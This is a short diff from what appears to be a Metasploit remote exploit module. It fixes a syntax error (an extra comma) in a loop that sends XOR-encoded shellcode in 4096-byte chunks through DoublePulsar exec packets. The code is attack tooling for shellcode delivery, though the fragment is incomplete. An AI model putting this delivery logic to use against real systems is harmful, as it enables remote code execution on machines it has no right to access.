@@ -211,7 +211,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	until times == iterations do
 		#break if times == iterations
 		copied_bytes = xor_shellcode[offset, 4096]
-      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, , total_size, 4096, offset)
+      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, total_size, 4096, offset)
 		offset += 4096
 		bytes_left -= 4096
 		times += 1
